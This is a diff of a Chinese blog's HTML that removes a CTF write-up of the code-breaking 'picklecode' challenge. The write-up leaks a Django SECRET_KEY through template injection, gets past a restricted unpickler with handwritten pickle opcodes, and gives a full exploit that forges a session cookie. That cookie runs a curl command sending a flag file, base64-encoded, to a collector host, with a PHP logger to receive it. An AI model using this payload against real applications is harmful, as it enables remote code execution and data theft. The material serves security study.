class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="picklecode"><a href="#picklecode" class="headerlink" title="picklecode"></a>picklecode</h1><ul>
-<li><p>python 反序列化，Django 模板引擎沙箱</p>
-</li>
-<li><p>基础知识 : <a href="https://peri0d.xyz/2019/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">python 反序列化</a></p>
-</li>
-<li><p>通常代码审计先看配置文件，Django 配置文件 <code>web/core/setting.py</code>，发现如下代码 : </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SESSION_ENGINE = <span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line">SESSION_SERIALIZER = <span class="string">'core.serializer.PickleSerializer'</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>一般默认的 Django 配置文件是不含这两项的，<code>SESSION_ENGINE</code> 是用户 session 存储的位置，<code>SESSION_SERIALIZER</code> 是 session 存储的方式。用户的 session 先经过 <code>SESSION_SERIALIZER</code> 处理成一个字符串后存储到 <code>SESSION_ENGINE</code> 指定的位置。在这里，就是 session 使用 pickle 的序列化方法，经过签名后存储在 cookies 中，我们所不知道的就是签名的密钥</p>
-</li>
-<li><p>思路就是获取密钥，pickle 反序列化</p>
-</li>
-<li><p>阅读路由信息，首先会调用 <code>views.RegistrationLoginView.as_view()</code> 函数，进行登录或者注册之后，在 <code>views.index()</code> 函数中直接将用户名拼接到模板中，也就是说这里存在着 SSTI 漏洞，那就可以利用它获取 <code>SECRET_KEY</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    django_engine = engines[<span class="string">'django'</span>]</span><br><span class="line">    template = django_engine.from_string(<span class="string">'My name is '</span> + request.user.username)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(<span class="literal">None</span>, request))</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>随意构造一个 username 为 <code></code> 可以看到一个加密后的密码，这就验证了 SSTI</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_1.png" alt></p>
-</li>
-<li><p>在 <code>/template/registration/login.html</code> 的 <code>csrf_token</code> 处下个断点，可以看到有很多变量，其中有一部分是加载模板的时候传入的，还有一部分是 Django 自带的，可以在 <code>settings.py</code> 中的 <code>templates</code> 查看自带的变量</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_2.png" alt></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">'BACKEND'</span>: <span class="string">'django.template.backends.django.DjangoTemplates'</span>,</span><br><span class="line">        <span class="string">'DIRS'</span>: [],</span><br><span class="line">        <span class="string">'APP_DIRS'</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">'OPTIONS'</span>: &#123;</span><br><span class="line">            <span class="string">'context_processors'</span>: [</span><br><span class="line">                <span class="string">'django.template.context_processors.debug'</span>,</span><br><span class="line">                <span class="string">'django.template.context_processors.request'</span>,</span><br><span class="line">                <span class="string">'django.contrib.auth.context_processors.auth'</span>,</span><br><span class="line">                <span class="string">'django.contrib.messages.context_processors.messages'</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这里的 <code>context_processors</code> 就代表会向模板中注入的一些上下文。通常来说， <code>request</code> 、 <code>user</code> 、和 <code>perms</code> 都是默认存在的，但显然， <code>settings</code> 是不存在的，我们无法直接在模板中读取 settings 中的信息，包括密钥。Django 的模板引擎有一定限制，比如<strong>无法读取用下划线开头的属性</strong></p>
-</li>
-<li><p>经过一番寻找，在 <code>request.user.groups.source_field.opts.app_config.module.admin.settings</code> 处发现 <code>SECRET_KEY</code> ，那就可以构造 username 为 <code>request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY</code> 即可获取签名密钥了 <code>zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm</code></p>
-</li>
-<li><p>接着就是 pickle 的反序列化了，其核心文件为 <code>/core/serializer.py</code> </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>其中设置了一个反序列化沙盒，禁用了 <code>&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;</code> 并且只允许调用 python 内置函数</p>
-</li>
-<li><p>但是 <code>getattr</code> 这个万金油函数没有被限制，那就可以使用 <code>builtins.getattr(builtins,&#39;eval&#39;)</code> 来获取 <code>eval</code> 函数，这就相当于绕过了这个沙盒</p>
-</li>
-<li><p>首先执行 <code>getattr</code> 获取 <code>eval</code> 函数，再执行 <code>eval</code> 函数，这实际上是两步，而我们常用 <code>__reduce__</code> 生成的序列化字符串，只能执行一个函数，这就产生矛盾了，所以就要放弃 <code>__reduce__</code> 直接手写 pickle 代码</p>
-</li>
-<li><p>pickle 是一种堆栈语言，它没有变量名这个概念，pickle 的内容存储在 stack(栈) 和 memo(存储信息的列表) 中。首先将 payload <code>b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;</code> 写进一个文件</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'whoami'</span>,))</span><br><span class="line"></span><br><span class="line">person = Person()</span><br><span class="line">f = open(<span class="string">'pickle'</span>,<span class="string">'wb'</span>)</span><br><span class="line">pickle.dump(person ,f, protocol = <span class="number">0</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行 <code>python -m pickletools pickle</code> 对其分析，得到一堆操作指令(opcode)</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_4.png" alt></p>
-</li>
-<li><p>阅读源码可以获得所有的 opcodes</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_5.png" alt></p>
-</li>
-<li><p>这段 pickle 代码所涉及到的部分符号意思如下 : </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c : 引入模块和对象，模块名和对象名以换行符分割。（find_class校验就在这一步，也就是说，只要c这个OPCODE的参数没有被find_class限制，其他地方获取的对象就不会被沙盒影响了，这也是为什么要用getattr来获取对象）</span><br><span class="line">p : 将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</span><br><span class="line">( : 压入一个标志到栈中，表示元组的开始位置</span><br><span class="line">V : 向栈中压入一个(unicode)字符串</span><br><span class="line">t : 从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</span><br><span class="line">R : 从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</span><br><span class="line">. : 表示整个程序结束</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>那么这段 pickle 就很容易懂了</p>
-<figure class="highlight plain"><figcaption><span>language</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00: c    GLOBAL     &apos;nt system&apos; # 向栈顶压入 &apos;nt.system&apos; 这个可执行对象</span><br><span class="line">11: p    PUT        0 # 将这个对象存储到 memo 的第 0 个位置</span><br><span class="line">14: (    MARK # 压入一个元组的开始标志</span><br><span class="line">15: V        UNICODE    &apos;whoami&apos; # 压入字符串&apos;whoami&apos;</span><br><span class="line">23: p        PUT        1 # 将这个字符串存储到 memo 的第 1 个位置</span><br><span class="line">26: t        TUPLE      (MARK at 14) # 将由刚压入栈中的字符串弹出，再将由这个字符串组成的元组压入栈中</span><br><span class="line">27: p    PUT        2 # 将这个元组存储到 memo 的第 2 个位置</span><br><span class="line">30: R    REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，这里即为 &apos;nt.system(&apos;whoami&apos;)&apos; ，将结果压入栈中</span><br><span class="line">31: p    PUT        3 # 将栈顶的元素(也就是刚才执行的结果)存储到 memo 的第 3 个位置</span><br><span class="line">34: .    STOP # 程序结束</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>简化为如下代码，memo 没有起到太大作用，但这段代码仍然可以执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nt</span><br><span class="line">system</span><br><span class="line">(Vwhoami</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>接着开始写 pickle 代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins # 将 builtins 设为可执行对象</span><br><span class="line">getattr # 获取 getattr 方法</span><br><span class="line">(cbuiltins # 压入元组开始标志，并将 builtins 设为可执行对象</span><br><span class="line">dict # 获取 dict 对象</span><br><span class="line">S&apos;get&apos; # 压入字符串 &apos;get&apos;</span><br><span class="line">tR(cbuiltins # 弹出 builtins.dict,get 并组成新的元组压入栈中。然后执行 builtins.getattr(builtins.dict,get) 得到 get 方法压入栈中。再压入元组标志，将 builtins 设为可执行对象</span><br><span class="line">globals # 获取 builtins.globals</span><br><span class="line">(tRS&apos;builtins&apos; # 压入元组标志，执行 builtins.globals，然后压入字符串 &apos;builtins&apos;</span><br><span class="line">tRp1 # 执行 get(builtins)，获取到 builtins 对象存储到 memo[1] 处</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>python 代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">data = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">.'''</span></span><br><span class="line"></span><br><span class="line">data = pickle.loads(data)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"><span class="comment"># &lt;module 'builtins' (built-in)&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后利用这个没有限制的 <code>builtins</code> 对象获取危险函数，并执行，这就绕过了沙盒</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins # 将 builtins 设为可执行对象</span><br><span class="line">getattr # 获取 getattr 方法</span><br><span class="line">(g1 # 压入数组，压入上一步获取的 builtins 对象</span><br><span class="line">S&apos;eval&apos; # 压入字符串 &apos;eval&apos;</span><br><span class="line">tR(S&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; # 获取到 eval 函数。将字符串 &apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; 压入</span><br><span class="line">tR. # 执行 eval(&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>上面都是绕过的分析，看一下本题有哪些可控点，考虑 <code>SESSIONID</code> ，接下来就看一下源码中对于它的操作</p>
-</li>
-<li><p>它使用的是 <code>django.contrib.sessions.backends.signed_cookies</code> 直接导入</p>
-</li>
-<li><p>python 代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">	blacklist = &#123;<span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">		<span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">		<span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">			<span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">		<span class="comment"># Forbid everything else.</span></span><br><span class="line">		<span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">	<span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">data = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S'eval'</span></span><br><span class="line"><span class="string">tR(S'__import__("os").system("id")'</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">.'''</span></span><br><span class="line"></span><br><span class="line">data = restricted_loads(data)</span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_6.png" alt></p>
-</li>
-<li><p>本题的 exp 如下，由于在同一个局域网就在物理机上写了一个接收的 php</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins,io</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">data = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S'eval'</span></span><br><span class="line"><span class="string">tR(S'__import__("os").system("curl http://192.168.0.100/xss/xss.php?$(cat /flag_djang0_p1ckle | base64)")'</span></span><br><span class="line"><span class="string">tR</span></span><br><span class="line"><span class="string">.'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64_encode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(s).strip(<span class="string">b'='</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pickle_exp</span><span class="params">(SECRET_KEY)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    is_compressed = <span class="literal">False</span></span><br><span class="line">    compress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> compress:</span><br><span class="line">        <span class="comment"># Avoid zlib dependency unless compress is being used</span></span><br><span class="line">        compressed = zlib.compress(data)</span><br><span class="line">        <span class="keyword">if</span> len(compressed) &lt; (len(data) - <span class="number">1</span>):</span><br><span class="line">            data = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">    base64d = b64_encode(data).decode()</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">'.'</span> + base64d</span><br><span class="line">    SECRET_KEY = SECRET_KEY</span><br><span class="line">    <span class="comment"># 根据SECRET_KEY进行Cookie的制造</span></span><br><span class="line">    session = signing.TimestampSigner(key = SECRET_KEY,salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>).sign(base64d)</span><br><span class="line">    print(session)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    SECRET_KEY = <span class="string">'zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm'</span></span><br><span class="line">    pickle_exp(SECRET_KEY)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_7.png" alt></p>
-</li>
-<li><p>xss.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = fopen(<span class="string">"cookies.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key=&gt;$value) </span><br><span class="line">&#123;</span><br><span class="line">	fwrite($data, $key.<span class="string">":"</span>.$value);</span><br><span class="line">	fwrite($data, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="thejs"><a href="#thejs" class="headerlink" title="thejs"></a>thejs</h1><ul>
-<li>JS 原型污染，没找到对应源码</li>
-<li><a href="https://bbs.pediy.com/thread-249643.htm" target="_blank" rel="noopener">Node.js原型污染攻击的分析与利用</a></li>
-<li><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">深入理解JavaScript Prototype污染攻击</a></li>
-<li><a href="https://www.codercto.com/a/41487.html" target="_blank" rel="noopener">一个题解</a></li>
-</ul>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/09/14/代码审计/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1032,320 +878,6 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/09/12/code-breaking picklecode中对signed_cookies引擎分析/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/10/python反序列化/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="peri0d">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/toux.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="peri0d的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/09/10/python反序列化/" itemprop="url">python 序列化与反序列化</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-10T15:57:15+08:00">
-                2019-09-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2019/09/10/python反序列化/" class="leancloud_visitors" data-flag-title="python 序列化与反序列化">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>关于 python 序列化与反序列化的一些基础知识，有待补充</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/09/10/python反序列化/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
